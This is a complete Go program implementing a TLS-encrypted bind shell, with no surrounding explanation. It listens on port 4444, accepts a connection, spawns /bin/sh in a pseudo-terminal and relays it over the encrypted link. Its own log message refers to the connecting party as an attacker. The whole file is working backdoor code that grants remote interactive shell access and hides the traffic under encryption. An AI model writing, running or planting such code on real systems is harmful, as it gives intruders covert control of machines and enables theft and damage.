package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"os/exec"

	"github.com/creack/pty"
)

const listenPort = "4444"

func main() {
	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		fmt.Println("Error loading certificate", err)
		return
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}

	ln, err := tls.Listen("tcp", ":"+listenPort, config)
	if err != nil {
		panic(err)
	}
	defer ln.Close()
	fmt.Println("Listening for connections on port", listenPort)

	conn, err := ln.Accept()
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("Connection established with attacker")

	cmd := exec.Command("/bin/sh")

	pty, err := pty.Start(cmd)
	if err != nil {
		panic(err)
	}
	defer pty.Close()

	go func() {
		_, _ = io.Copy(pty, conn)
	}()
	_, _ = io.Copy(conn, pty)
}
